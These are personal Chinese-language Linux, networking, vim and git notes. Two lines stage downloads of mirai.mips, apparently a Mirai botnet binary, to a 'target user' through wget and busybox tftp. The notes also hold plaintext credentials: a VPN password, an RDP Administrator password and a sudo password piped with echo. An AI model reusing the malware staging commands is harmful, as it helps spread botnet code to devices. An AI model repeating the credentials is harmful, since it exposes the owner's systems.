	urllib2.urlopen > urllib.request.urlopen()
          	data = response.read().decode('latin-1'), 'latin'不能直接用'utf-8'

- kill:
	- ps -ef | grep python
	- ps -aux ; 以BSD风格显示进程, 常用
	- pstree 
	- kill -9 12312 ; 通过进程号杀死进程
	- -9表示强制杀死
	- kill -9 -1 ; 表示杀死当前用户的所有进程
	- pkill python ; 通过程序的名字杀死所有进程
	- killall python ; 通过程序的名字杀死所有进程
	- xkill ; 杀死桌面图形界面的程序, 然后鼠标点哪哪终止, 右键取消

- 区分Linux发行版：
	- radhat或centos存在：/etc/redhat-release 这个文件
	- debian或ubuntu 存在 /etc/debian_version 这个文件

- unity:
	+ 恢复：unity --reset
	+ reboot

- 安装xgboost：
	+ pass


## 常用命令

- curl
	+ 安装：sudo apt install curl
	+ 请求：curl baidu.com
	+ 下载：curl -o save baidu.com
		* 把网页保存到save文件
	+ 上传：curl -T "img[1-100].png" http://www.example.com
	+ post方法：
		* -d或--data：表示post请求
		* 当提交的参数中有特殊字符就需要先转义，如空格时，就转义为%20
		* --data-urlencode：可以自动转义成特殊字符，无需人工事先转义
		* -F或--form：将本地文件上传到服务器，curl -F "filename=@/home/test/test.pic" http://example.com/example.php不能漏掉@符号
	+ 和wget比较：
		* wget简单
		* curl多功能的工具，支持更复杂的使用，完全模拟命令行的浏览器，只是不会渲染接收到的信息；

- wget：
	+ 专业的直接下载程序，支持递归下载。同时，它也允许你下载网页中或是 FTP 目录中的任何内容。
	+ wget 拥有智能的默认设置。它规定了很多在常规浏览器里的事物处理方式，比如 cookies 和重定向，这都不需要额外的配置。可以说，wget 简直就是无需说明，开罐即食！
	+ wget 是一个独立的程序，无需额外的资源库，更不会做其范畴之外的事情。

- 使用bash命令：
	+ bash a.sh
	+ sh sbin/start-all.sh
	+ . sbin/start-all.sh

- Linux只存在只读权限：
	+ 切换root用户，w！，或者直接chmod增加读写
	+ 不切换root：:w !sudo tee %
		* ！： 表示执行外部命令
		* tee： linux命令，这个有点复杂
		%：在执行外部命令时，%会扩展成当前文件名；这个%区别于替换时的%，替换时%的意义是代表整个文件，而不是文件名

- 映射便捷操作：
	+ 把长串的命令映射为一个简单的命令，添加到.vimrc中：
	+ " Allow saving of files as sudo when I forgot to start vim using sudo.
 	cmap w!! w !sudo tee > /dev/null %
 	+ 命令后半部分> /dev/null 是为显式的丢掉标准输出的内容。

- 修改用户：
	+ root登录
	+ vim /etc/passwd
	+ vim /etc/group
	+ vim /etc/gshadow
	+ vim /etc/shadow
	+ mv /home/olduser 为 /home/newuser :其下所有的文件所属用户和用户组都自动修改好，不需要自己手动用chown -R修改。
	+ 重启
	+ vim /etc/sudoers
		* 前chmod u+w /etc/sudoers 
		* 后chmod u-w /etc/sudoers
- alias:
	- 临时: alias xmind='XMind'
	- 永久: 保存在.bashrc或其他文件下

 - cp：cp 待复制文件 新文件
 	- cp -r 待复制文件夹 新文件夹

- 查看系统信息：
	- 查看系统：lscpu
	- 查看显卡：lspci | grep VGA
	- 查看GPU使用：
		+ nvidia-smi
		+ 推荐工具：
			* pip install gpustat
			* watch --color -n1 gpustat -cpu # 动态实时监控GPU使用情况
	- 查看nvidia芯片：
		+ lspci | grep -i nvidia
	- 实时查看显存信息：
		+ whatis watch # 周期性的执行某一条命令，并输出全屏显示
		+ watch -n 10 command # 每10s执行一次command
		+ watch -n 10 nvidia-smi

- 查找文件：
	+ find ./ -name a.py 2>/dev/null/
		* /dev/null是一个特殊的文件，表明空的或者错误的信息，这样查询到的错误信息将被转移了，不会再显示了
	+ 


## 网络：远程控制+文件共享

- 关闭防火墙：sudo ufw status ; sudo ufw disable;

- 端口冲突：
	- fuser 3000/tcp
	- kill 28597
- 查看启动的端口：
	+ netstat -tlnp

- VPN:
 	- 服务器:
 		- https://linghucong.js.org/2016/04/20/setup-Shadowsocks-on-ubuntu-1604/
 	- 客户端:
 		- 见: http://www.jeyzhang.com/how-to-install-and-setup-shadowsocks-client-in-different-os.html
 		- sudo add-apt-repository ppa:hzwhuang/ss-qt5
		- sudo apt-get update
 		- sudo apt install shadowsocks-Qt5
 		- UI界面
 		- Address: 
 			-  2001:19f0:7001:f96:5400:00ff:fe80:92a1
 			- 没有ipv6的用ipv4地址:172.105.208.81
 		- Port: 1234,1236
 		- password: luolvgen
- 搭建自己的VPS：
	+ VPS：是Virtual Private Server的英文件缩写，说得是在一台服务器上创建多个相互隔离的虚拟服务器。
	+ VPN：VPN是一个软件。用一个帐号和密码，我们登陆了以后，我们的机器访问网站或者是上QQ或者是登陆一些网络软件的时候，所显示的和使用的IP都是国外的。也就是说，VPN是一个可以让我们的机器直接连接到国外的网线上的东西。VPN分为两种，一种是静态的VPN，另外一种就是动态的VPN。动态的VPN是每登陆一次，就变化一次IP的。
	+ 服务器选择：搬瓦工https://bwh1.net/
	+ 


- 远程连接：
	+ Ubuntu连接windows：
		* 安装rdesktop：sudo apt install rdesktop
		* rdesktop -f -a 16 10.10.4.42 -u Administrator -p 1qazZAQ!
		* 连接不上，报错，可能是账户密码错误；或者就是没有开启宿机windows的远程管理，放开只能网络连接限制
		* 或者使用Ubuntu自带的remote软件，都是使远程连接协议RDP
	+ 进行文件传输：
		* 将本地文件挂载到服务器运行：
		* rdesktop 10.10.4.42 -r sound:local -r disk://batista=/home/yuziqi/project/
		* batista为服务器上虚拟盘符的地址名称，
		* -r sound:local这个虽然看起来无所谓，但是有bug，最好还是要加上
	+ 支持复制粘贴：
		* rdesktop  -f -a 16 10.10.4.42 -u Administrator -p 1qazZAQ! -r clipboard:PRIMARYCLIPBOARD -r disk://batista=/home/yuziqi/project/
	+ 远程linux之间传输：
		* scp也就是secure copy，是linux下基于ssh登录进行安全的远程文件拷贝命令
		* 前提：sudo apt install ssh
		* scp 参数 源路径 目标路径
		* 本地到远程：scp -r local_file remote_username@remote_ip:remote_folder
			- 加了remote_username需要输入密码，不加则需要输入用户名和密码
		* 远程到本地：scp -r root@10.153.5.21:/opt/gopath/src/github.com/hyperledger/fabric/examples/e2e_cli/channel-artifacts ./
			- scp -r root@10.153.5.21:/opt/gopath/src/github.com/hyperledger/fabric/examples/e2e_cli/crypto-config ./


docker-compose -f docker-compose-peer.yaml down
docker-compose -f docker-compose-peer.yaml up -d
docker exec -it cli bash

docker history hyperledger/fabric-kafka:1.2.0  --no-trunc

peer chaincode query -C "mychannel" -n mycc -c '{"Args":["query","a"]}'

rm -rf channel-artifacts/ crypto-config
mkdir channel-artifacts


bash /opt/kafka/bin/kafka-server-start.sh /opt/kafka/config/server.properties --override broker.id=$KAFKA_BROKER_ID --override zookeeper.connect=$KAFKA_ZOOKEEPER_CONNECT --override message.max.bytes=$KAFKA_MESSAGE_MAX_BYTES --override replica.fetch.max.bytes=$KAFKA_REPLICA_FETCH_MAX_BYTES --override unclean.leader.election.enable=$KAFKA_UNCLEAN_LEADER_ELECTION_ENABLE --override min.insync.replicas=$KAFKA_MIN_INSYNC_REPLICAS --override default.replication.factor=$KAFKA_DEFAULT_REPLICATION_FACTOR --override zookeeper.session.timeout.ms=$KAFKA_ZOOKEEPER_SESSION_TIMEOUT_MS --override zookeeper.connection.timeout.ms=$KAFKA_ZOOKEEPER_CONNECTION_TIMEOUT_MS --override advertised.host.name=$KAFKA_ADVERTISED_HOST_NAME;


- 脚本连续执行多行：
	+ ;  : 连续执行多行
	+ && : 连续执行多行，前面中断则后面不执行
	+ || : 连续，前面成功，则后面不执行

- windows复制文件到Linux —— 同一局域网下
    1.Linux服务器：XFTP方式（建立连接） 或 远程工具XSHELL（登录直接yum安装） 或 Linux安装samba服务器
    2.Linux虚拟机：XFTP方式（虚拟与实体） 或 利用VMTOOL工具直接拖拽（安装的操作系统版本很新，都是Vmware的版本比较老，晚于操作系统出来）
    	- 点击虚拟机-安装tools-复制到虚拟机的一个位置-解压后:
    	- sudo ./vmware-install.py
    	- 一路回车到底
    	- 重启虚拟机即可

- windows通过xshell复制文件到Linux：
	+ 1.linux安装ftp服务器
	+ 2.linux安装rz：
		* sudo apt install lrzsz
		* 接受文件：rz -e 打开窗口，选择文件
		* -e：对所有控制字符转义
		* -b：以二进制方式，默认为文本方式；
		* rz -e a.tar.gz
		* rz -eb a.sh

- 通过外网访问内网：
	+ 端口转发方法：
		* 利用路由器的虚拟服务器功能/端口映射功能，将内网映射到外网，从而实现外网访问内网指定端口的服务。
			* 缺陷：有时候不能实现，因为公网ipv4地址不够用，所以服务提供商一般分配给用户的都是NAT后的局域网的IP，无法实现端口映射、远程访问了。
		+ nat123的端口映射：
			* 
	+ 内网穿透方法：
		* ngrok内网穿透：需要有一个域名和公网ip的服务器。
		* ssh内网穿透：需要有一个公网ip的服务器：
			- 转发到远端：ssh -C -f -N -g -L 本地端口:目标IP:目标端口 用户名@目标IP
			- 转发到本地：ssh -C -f -N -g –R 本地端口:目标IP:目标端口 用户名@目标IP
			- 动态端口转发：ssh -C -f -N -g -D listen_port 用户名@目标IP 
		* n2n内网穿透：
		* 花生壳内网穿透：
		* 专用的端口映射工具PortTunnel
	+ 重定向方法：

- 内网穿透实例：http://arondight.me/2016/02/17/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/
	+ 机器：
		* A，位于公网，地址A_ip，需要sshd
		* B，位于NAT后，地址localhost，需要sshd
		* C，位于NAT后，地址localhost，不需要sshd
	+ 目的：希望A主动向B发起SSH连接，但B位于NAT后，无可用公网IP+端口的组合，所以A无法穿透NAT
	+ SSH反向隧道：
		* B向A主动建立一个SSH隧道，将A的6766端口转发到B的22端口上（只要隧道不关闭，这个转发就是有效的），这样只需要访问A的6766端口反向连接B即可
		* B机器：建立一个SSH隧道，将A的6766端口转发到B的22端口上
			- ssh -p 22 -qngfNTR 6766:localhost:22 userA@A_ip
		* A机器：利用A的6766端口反向SSH到B
			- ssh -p 6766 userB@localhost

- Samba：根据SMB协议实现的，主要用于Windows和Linux之间共享资源
    1.安装samba：sudo apt-get install samba
        修改配置文件：vi /etc/samba/smb.conf  的global加入：usershare owner only=false
        sudo chmod 777 myshare
    2.右键文件夹选择共享文件
    3.在windows的地址栏输入：`\\ip（Linux的ip）`
    4.win10的解决方案：
    	0. win+R；services.msc，找到workstation服务，停止后再启动；
    	1，Windows10（作为客户端）无法访问其它服务器上共享出来的目录
			1，打开注册表编辑器（运行regedit并回车）；
			2，展开HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters，右击Parameters，选择“新建”-“DWORD (32位)值”，名称为AllowInsecureGuestAuth，并且将该值设置为1，保持默认的16进制不变。
			立即生效：任务管理器杀掉explorer.exe，然后在新建explorer任务；
		2，Windows10（作为服务端）的共享目录，在其它服务器上无法访问
			1，打开控制面板\网络和 Internet\网络和共享中心\高级共享设置；
			2，找到“所有网络”下面的“密码保护的共享”，选择“关闭密码保护共享”。
	5. 记得把虚拟记得设置：共享启用；

- IP网络配置:
	sudo gedit /etc/network/interfaces
	# net for xingongsuo
	# auto ens33
	iface ens33 inet static
	address 10.10.28.102 
	netmask 255.255.254.0
	gateway 10.10.28.1
	dns-nameservers 210.73.64.1  # 永久生效
- dns配置：
	+ vi /etc/resolv.conf
	+ 增加：nameserver 210.73.64.1
- 重启网络：
	+ 单纯使用断开重连的方式不正确
	+ 应该为：
		* sudo ip addr flush eno2 
		* sudo systemctl restart networking.service
	+ 远程连接的时候：
		* echo yuziqi | sudo -S ip addr flush eno2 && sudo service networking restart
	
- 关闭其他网络：
	+ sudo ifconfig docker0 down
	+ 或者直接：sudo ifdown eno2
	+ sudo ifup eno2
- 查看网络：
	+ ifconfig ens33

- Busybox：
	+ linux工具里的瑞士军刀
	+ 集成压缩了linux的工具和命令，用来创建可引导的Linux急救系统
	+ busybox ls

- Ubuntu开启telnet功能：
	+ sudo apt install openbsd-inetd xinetd telnetd
	+ 修改/etc/inetd.conf添加一行：telnet stream tcp nowait telnetd /usr/sbin/tcpd /usr/sbin/in.telnetd
	+ 修改/etc/xinetd.conf,添加：
		* instances=60
		* log_type=SYSLOG authpriv
		* log_on_success=HOST PID
		* log_on_failure=HOST
		* cps=25 30
	+ 编辑/etc/xinetd.d/telnet文件：
		# default: on   
		# description: The telnet server serves telnet sessions; it uses \   
		# unencrypted username/password pairs for authentication.   
		service telnet   
		{   
		disable = no   
		flags = REUSE   
		socket_type = stream   
		wait = no   
		user = root   
		server = /usr/sbin/in.telnetd   
		log_on_failure += USERID   
		}
	+ 重启机器或网络：
		* sudo /etc/init.d/xinetd restart 
	+ 测试：
		* 查看telnet运行状态：netstat -a | grep telnet
		* 登录127.0.0.1：
			- telnet localhost
			- ok

- Ubuntu建立apache服务器：
	+ sudo apt install apache2 -y
	+ sudo service apache2 start
	+ 默认目录在：/var/www/html
	+ 目标用户下载：wget http://192.168.1.2/mirai.mips

- ubuntu 开启ftp服务器：
	+ sudo apt install tftpd-hpa
	+ vi /etc/default/tftpd-hpa
		TFTP_USERNAME="tftp"
		TFTP_DIRECTORY="/tftpboot"
		TFTP_ADDRESS="0.0.0.0:69"
		TFTP_OPTIONS="--secure --create"
	+ mkdir /tftpd-hpa
	+ chmod 777 -R /tftpd-hpa
	+ chown tftp:nogroup -R /srv/tftpboot/  # 不用也可以
	+ service tftpd-hpa restart
	+ 测试：
		* netstat -a | grep tftp
		* echo 'test tftp' > /tftpboot/test
		* tftp localhost
		* get test
		* quit
		* busybox中：tftp -g -r mirai.mips 192.168.1.140  #
			- -g表示下载文件get
			- -p表示上传文件put
			- -l表示本地文件名local file
			- -r表示远程主机的文件名remote file

- Ubuntu搭建私有DNS：
	+ DNS：域名系统
		* DNS使用TCP和UDP端口53
		* FQDN：完全限定域名
		* SOA：start of authority起始授权记录，一个区域zone的解析库中有且只能有一条SOA记录，必须为解析库中的第一条记录，定义主DNS服务器地址和相关事件时间定义。
		* A：实现FQDN ==> IP 
		* MX：标明提供邮件服务的主机
		* NS：标明当前域内的DNS服务器
		* AAAA：FQDN ==> IPv6
		* CNAME：Canonical Name，别名记录
			- www IN A example.com  # 用户访问example.com的时候也会产生www.example.com效果
		* PTR：IP ==> FQDN
	+ 安装bind9：sudo apt install bind9
		* sudo apt install bind9-host dnsutils
		* sudo apt install bind9-doc
	+ 配置bind：
		* 添加一个zone：
			- sudo gedit /etc/bind/named.conf.local
				+ zone "example.com" {type master; file "/etc/bind/db.example.com"}
				+ 正向区域
				+ zone "168.192.in-addr.arpa" {type master; file "/etc/bind/db.168.192"}
				+ 反向区域（ 反向区域名称以“168.192”，这是“192.168”的八位逆转开始 ）
			- 正向：
				+ sudo cp db.local db.example.com
				+ sudo gedit /etc/bind/db.example.com
				+ 修改相应的example.com的位置
			- 反向：
				+ sudo cp db.local db.168.192
				+ 修改相应的192.168.1.130和example.com
	+ 测试：
		* 检查主配置文件语法named-checkconf
		* 修改配置后，需要重启bind服务
			- sudo /etc/init.d/bind9 restart
			- sudo service bind9 restart  # 这两者不一样，最保险用前者
		* 查看log日志是否正确：sudo tail /var/log/syslog
		* 服务器端解析域名：host -t A example.com 192.168.1.130
		* 客户端解析域名：nslookup example.com，直接ping也行
	+ 

- ping大概测网速：
	+ windows下：ping 192.168.1.6 -l 1000  # 发送1000个字节
	+ linux下：ping 192.168.1.6 -s 1000 
	+ 速度为=1000 / 返回的时间ms = 多少个k字节
- 查看路由过程：
	+ linux：traceroute hostname
		* 或者：tracepath hostname
	+ windows：tracert hostname
- linux下的网络工具：
	+ iperf
	+ netperf
- 安装必要的工具
	+ apt install net-tools

## shell使用:
1. shell：
	- shell是一个交互性命令解释器
	- shell独立于操作系统，可以让用户灵活选择适合自己的shell
	- 执行过程：命令行输入命令，经过shell解释后传送给操作系统内核执行
	- 
2. bash：
	- bash：borne again shell，是shell的一种，Linux上默认采用bash
	- 在命令行中输入bash命令，就相当于进入bash环境，如果再次开启，那就是进入了一个bash子环境(子进程)
2. ll -rt
3. shell编程：
	- 单行注释：#
	- 多行注释：
		+ 把输入重定义到前面的命令，:是空命令，所以就相当于注释
		+ BLOCK:是Here Documents中的定义符号，名称任意，只要前后匹配就行；
		```
		:<<BLOCK
		注释的内容
		BLOCK
		```
	- ()表示使用子shell
	- <表示把命令的输出到一个临时文件
	- echo -e "\n打印空行"
	- [EXPRESSION] 表示条件判断
	- 逻辑表达式：
		+ 与：-a，例，判断文件123.txt是不是可读写
			* [ -r 123.txt -a -w 123.txt ]
			* [ -r 123.txt ] && [ -w 123.txt ]
		+ 或：-o，例，判断变量num是不是等于数字101或102
			* [ "$num" -eq "101" -o "$num" -eq "102" ]
			* [ -r 123.txt ] || [ -w 123.txt ]
		+ 非：!，例，判断文件123.txt是不是不可读
			* [ ! -r 123.txt ]
	- if：
		+ 大于：-gt(greater than)，大于等于：-ge(greater equal)，小于：-lt(less than)，小于等于：le(less equal)，不等于：-ne(not equal)
		```
		if 条件1
		then 命令1
		elif 条件2
		then 命令2
		else 命令3
		fi
		```
	- for:
		```
		# 方式1
		for 变量名 in 列表
		do
		命令1
		命令2...
		done
		# 方式2
		sum=0
		for ((i=1;i<10;i++)) 
		do 
		((sum=$sum+$i))
		done 
		```
	- while:
		```
		val=0
		while [ "$val" -lt "5" ]
		do
		# 输出数值
		echo "val=$val"
		# 将数值加1
		((val++))
		done	
		```
	- 字符串：
		+ 截断：
			* str=123456
			* 字符串最后一个字符：
				- Final=`echo ${str: -1}`
				- 或者：Final=${str: -1}
		+ 拼接：
			* 变量+字符串：res=${val}"asd"
			* 字符串+变量：res="CO_${index}"
		+ 单引号：''
			* 单引号之间全是字符串，不论格式
			* 要想在单引号内插入变量：
				- '"'内容'"' 替换原来的 "内容"
	- 数组：
		+ 赋值：
			* array=(a,b,$c)  # 传入的是a，b，c变量的值
			* array=("1" "2" "3") # 空格分割即可
		+ 计算数组元素个数：
			* `${#array[*]}`
			* `${#array[@]}`
		+ 引用数组：
			* echo ${array[i]} # 单个值
			* echo ${array[*]} # 所有值
	- 随机数：
		+ RANDOM 是 Bash 的一个内建函数(而不是常量)，产生0-32767内的整数
		+ 指定种子seed：
			* RANDOM=10
			* echo $RANDOM

4. 变量：
	- echo ${a:-abc} # 如果a没有值，那就借给a一个值，此次命令执行完后，a还是空值；
5. 


## vim技巧：

 - 配置vim：https://github.com/ma6174/vim
 - 手动配置vim：
 	+ vim ~/.vimrc
 	+ set nu "显示行号，nonu不显示行号
 	+ set hlsearch "搜索时关键字高亮反白
 	+ set backspace=2 "允许退格键删除
 	+ set autoindent "自动缩进
 	+ set showmode "显示左下角状态行
 	+ set ruler "显示右下角，行列信息
 	+ set bg=dark "背景色为暗色
 	+ set mouse=a "允许鼠标移动光标
 	+ set tabstop=4
 	+ set softtabstop=4 "设置tab键宽度
 	+ syntax on "语法检查，语法高亮
 	+ colorscheme cpp "使用cpp高亮方案

- vim技巧：
	- 跳转：
		1. w跳词头，e跳词尾
    	2. ctrl+s是停止输入;ctrl+q是继续输入;看不见输入的内容了，直接输入exit回车，退出该终端;
    	3. ctrl+a回到文件开头
    	4. gg跳到文件开头，G跳到文件末尾

 - vim粘贴：
   1. 系统粘贴板：复制后 - 在vim的编辑模式直接shift+inset键;
   2. 使用快捷键粘贴：vim粘贴板：esc正常模式 - v进入可视模式 - 选中文本 - 按y复制 - 用p粘贴
   3. 使用鼠标或快捷键粘贴：如果设置vim的set mouse=a则是所有模式都是使用鼠标，就无法使用鼠标右键进行复制粘贴了，所以改为set mouse=v，这样按v键进入可视模式，只在可视模式下进行鼠标滚动；要是粘贴，就按esc或者鼠标单击正常模式，进行鼠标选择 - 按y复制 - 用p粘贴。

 - vim撤销：
   1. :u 或 :u[2]
   2. ctrl+R: 重做操作

- vim快速查找
	+ 普通查找：/word或者?word
	+ 快速1：让光标停留在一个单词的任意一个字母上，然后输入shift+*即可快速选中该单词，通过n或N进行匹配
	+ 快速2：让光标停留在单词的第一个字幕上，然后yw进行快速拷贝，然后输入Ctrl+R+0，回车，就查找到了匹配词

- git上配置的vim使用：
	1. F5编译，F8调试
	2. 自动插入文件头;
	3. F2取消代码中的空行;
	4. ctrl+P 自动补全
	5. 

## 
kubectl describe pod/peer0-k8sorg15-sdfsdf -n t15
kubectl exec -it peer0-org15-sdfsdf -n t15 echo a
kubectl logs peer0-org15-sdfsdf -c peer0-org15 -n t15 


192.168.125.77 zookeeper0
192.168.125.118 zookeeper1
192.168.125.76 zookeeper2
192.168.125.84 kafka0
192.168.125.127 kafka1
192.168.125.83 kafka2

## 在github上托管博客
1. create a repository and named ：hacker.github.io
	- 进入github，找到设置，最下面有删除
2. clone the repository: sudo git clone https://github.com/hacker.github.io/
	
3. 最终打开：
	- https://a550461053.github.io/hacker

## git概念：
1. 工作区（workspace）、暂存区（index）、本地仓库（local repository），当然还有远程仓库（remote repository）
2. 分支：
	- 本地分支: git branch
	- 远程分支: git branch -r
	- 
## git使用:
0. 选择问题：
	- 上传代码库：github，完美
	- 写博客平台：
		+ csdn：交互多
		+ github.io：300M上限，贴图麻烦
		+ WordPress：需要搭建服务器，麻烦，但功能多，爬虫、SEO
	- 写博客目的：
		+ 如果为了提高知名度，网上都是团队来做，而且偏简单的教程反而受众
		+ 如果为了工作面试，那时间不如用来专做技术，面试一谈便知深浅
		+ 总结就是，技术没做好，没必要写，技术有了一定的积淀，再去写，反而有含金量，容易推广
1. 创建版本库:
	- cd mygit
	- git config --global user.name "yuziqi"
	- git config --global user.email "a550461053@gmail.com"
	- git config user.name 
	- git config user.email
	- git init
	- nautious .git
	- vim 1.py
2. 文件添加到版本库: 
	- 添加到暂存区: git add 1.py
	- 文件提交到仓库: git commit -m "注释信息"
	- 查看是否还有未提交的文件: git status
	- 查看修改内容: git diff 1.py
	- 提交修改:
		- git add 1.py
		- git status -s ; 或者 git diff
		- git commit -m "文件增加了一行"
		- git status
3. 版本回退:
	- 查看版本历史记录: git log --pretty=oneline
	- 直接回退版本: git reset --hard HEAD
		- git reset --hard HEAD^ 上个版本
		- git reset --hard HEAD~100 上100个
	- cat 1.py
	- git log --pretty=oneline
	- 查看回退的版本号为948a21b: git reflog
	- git reset --hard 948a21b
4. 撤销修改:
	- 法一: 重新提交源文件
	- 法二: git reset --hard HEAD~100
	- 法三: git checkout -- 1.py : 撤销工作区的修改
		- 1.py修改后还没放到暂存区
		- 1.py已经放到暂存区了,就回到添加暂存区后的状态
	* 撤销修改了remote：
		- git revert HEAD
		- git revert CommitID
5. 删除文件:
	- rm 2.py
	- git add 2.py
	- git rm 2.py
	- 继续恢复: git checkout -- 2.py
6. 远程仓库github：
	- 1. 远程github创建一个repo, 勾选README.md
	- 2. 克隆到本地: 
		- git clone https://github.com/a550461053/matlab-seg.git
		- 指定深度为1: git clone git://xxoo --depth 1
	- 3. 上传文件: git init
		- touch README.md
		- git add README.md
		- git commit -m 'first test commit'
		- 执行一次就够了，git remote add origin https://github.com/a550461053/matlab-seg.git 
		- git push origin master
	- 4. push文件:
		- git add .
		- git commit -m 'first commit'
		- git remote add origin https://github.com/a550461053/matlab-seg.git
		- git push origin master
	- 5. push强制上传本地文件，覆盖云文件
		+ git push origin master --force
	- 6. pull强制下载云文件，覆盖本地文件
		- git remote add origin https://github.com/a550461053/BDCI2017-360.git
		- git fetch --all # 获取最新分支
		- git reset --hard origin/master
		- git pull origin master
	- 7. fetch+merge比pull更专业：
		+ git fetch origin master: 从远程的origin仓库的master主分支更新最新的版本到origin/master分支上
		+ git log -p master..origin/master: 比较本地的master分支和origin/master分支的差别
		+ git merge origin/master：合并内容到本地master分支	
	- 8. 修改config：
		+ 直接修改remote：git remote set-url origin [url]
		+ 先删后加：
			* git remote rm origin 
			* git remote add origin [url]
		+ 修改config文件
	- 9. 报错处理
		- fatal: remote origin already exists
			- 先执行: git remote rm origin
		- error:failed to push som refs to.......
			- 先执行: git pull origin master
	- 10. 设置免密码登录
		+ 创建ssh：
			- 在bash下：ssh-keygen -t rsa -C "550461053@qq.com"
			* -t是密钥类型，默认是rsa，可以省略
			* -C设置注释文字，比如邮箱
			* -f指定密钥文件存储文件名，不指定等会就得手动输入文件名
			* 接着提示需要输入两次密码，该密码是push文件时候要输入的密码
				* 如果不输入密码，直接按回车，那么push的时候就不需要输入密码，直接提交到github了。
		+ 创建ssh-key后，只需要添加id_rsa.pub中的内容到github的ssh key即可。
		+ 配置用户：
			* git config --global user.name "a550461053"
			* git config --global user.email "550461053@qq.com"
		+ 添加ssh密钥对：
			* 先删除已有的：ssh-add -D 
			* ssh-add id_rsa
			* ssh-add -l
		+ 测试连接：
			* ssh -vt a550461503@github.com
			* 如果出现：permission denied
				- 可能是过期了，重新生成。
				- 
	- 7. 上传空文件：
		+ touch data/ .gitignore
		+ git add data/.gitignore
		+ git commit -m "add empty .gitignore to data/"
		+ echo data >> .gitignore
		+ git add .gitignore
		+ git commit -m "add data to .gitignore"
	- 8. 删除无用的文件夹：
		+ echo .idea >> .gitignore
		+ git rm -r .idea --cache
		+ git add .
		+ git commit -m "delete .idea"
		+ git push origin master
7. 创建分支：
	- 创建分支：git branch dev
	- 切换分支：git checkout dev
	- 创建+切换：git checkout -b dev
	- 查看当前分支：git branch
	- 合并分支：在master下，git merge dev
		+ 如果冲突
		+ 先把本地dev推到远程master：git push origin dev:master -f
		+ 切回旧分支：git checkout master
		+ 本地旧分支master重置为dev：git reset --hard dev
		+ 在推送
	- 删除分支：git branch -d dev
	- 
8. 多人协作：
	- 三种合作方式：
		+ 1. Fork方式：
			* 大型的开源项目
			* 开发者自己fork自己生成一个独立的分支，跟主分支完全独立，pull代码后，项目维护者可以根据代码质量决定是否merge代码
		+ 2. 组织：
			* 组织的所有者可以针对不同的代码仓库建立不同访问权限的团队
			* Accounts settings -> organizations -> create new organizations建立一个组织，然后添加项目成员。
		+ 3. 合作者：
			* 小型合作项目，为单个仓库增加具备只读或读写权限的协作者
			* 进入repo的settings，在manage collaborators里面管理合作者。其他的合作者使用ssh-keygen -C "repoEmail@example.com" 生成公私钥，将公钥上传后，可以使用ssh登录。
	- 查看远程库：git remote ； git remote -v
	- 推送分支：
		+ master始终要与远程同步
		+ bug分支可以先合并到master
		+ git push origin master
		+ git push origin dev
	- 抓取分支：
		+ 先获取最新提交：
		+ git branch --set-upstream dev origin/dev
		+ git pull
	- 一般协作过程：
		+ 1.视图git push origin branch dev推送自己的修改
		+ 2.若推送失败，则因为远程分支比你的本地更新早，需要先git pull合并
		+ 3.若合并有冲突，需要解决冲突，并本地提交；在用git push origin branch dev推送
	- 区块链协作小组：
		+ git branch  # master 和 dev
		+ git checkout dev
		+ git checkout -b yuziqi
		+ 修改代码
		+ git add src  # 添加自己修改的文件
		+ git commit -m "yuziqi:xxx"
		+ git checkout dev
		+ git pull  # 更新最新代码
		+ git merge yuziqi # 合并新建的分支
			* 如果出现merge失败
			* 可以直接回退dev到merge之前，git reset --merge
			* 然后再次修改yuziqi分支，提交不冲突的部分；或者重新修改代码；
			* git add -A .  # 提交所有的修改
			* git commit -m "blabla"
		+ git push origin dev  # 把dev推到远程
9. 常用命令：
	- cd G:/
	- 查看历史记录：git log
	- 查看历史记录的版本号：git reflog
	- 对工作区的文件修改撤销：git checkout 2.py
	- 		
10. 多人合作项目
	- 项目负责人：
		+ 首先把队友直接push的权限关掉，设置为Read，可以防止队友误操作；
		+ 创建开发分支：
			* master稳定版，dev开发版
	- 其他成员：
		+ fork项目到自己的个人仓库
		+ clone自己的仓库项目到本地
		+ 创建本地dev分支：
			* git branch -a；查看本地和远程的所有分支
			* git checkout -b dev origin/dev；创建一个本地dev分支，并把远程dev分支的内容放在本地dev分支；并切换到该dev分支。
		+ 同步代码：
			* 查看是否有upstream：git remote -v
			* 如果没有upstream：git remote add upstream 团队项目地址
			* git remote -v
			* 开始同步，获取团队项目最新版本：git fetch upstream
			* 把最新版本合并到本地的dev分支上：git merge upstream/dev
		+ 提交代码：
			* git push；将本地的修改同步到自己的github仓库上
		+ 合并到团队项目：
			* 进入到自己fork的github仓库，点击pull request
			* 选择合并内容，和目标内容，点击create 
	- 项目负责人：
		+ 选择是否要合并到某个分支
		+ 如果发现有问题，可以关闭该pull request
			* 如果关闭了，一定要告诉队友，否则对方会不知道。
	- 创建分支：git
11. 已有的项目创建git
	- git init
	- git add .
	- git commit -m "123"
	- git remote add origin https://github.com/a550461053/my-bbs
	- 或者：git remote add origin git@github.com:a550461053/my-bbs.git
	- 提前在github注册好一个远程的空项目
12. 
- github常见问题：
	+ RPC failed; curl 56 GnuTLS recv error
	+ 解决：增大git的临时缓冲区，git config --global http.postBuffer 2000000000


## ELK
1. ElasticSearch是一个基于Lucene的开源分布式搜索服务器。它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是第二流行的企业搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。 
在elasticsearch中，所有节点的数据是均等的。
2. Logstash是一个完全开源的工具，它可以对你的日志进行收集、过滤、分析，支持大量的数据获取方法，并将其存储供以后使用（如搜索）。说到搜索，logstash带有一个web界面，搜索和展示所有日志。一般工作方式为c/s架构，client端安装在需要收集日志的主机上，server端负责将收到的各节点日志进行过滤、修改等操作在一并发往elasticsearch上去。
3. Kibana 是一个基于浏览器页面的Elasticsearch前端展示工具，也是一个开源和免费的工具，Kibana可以为 Logstash 和 ElasticSearch 提供的日志分析友好的 Web 界面，可以帮助您汇总、分析和搜索重要数据日志。（angular项目）
- why ELK？
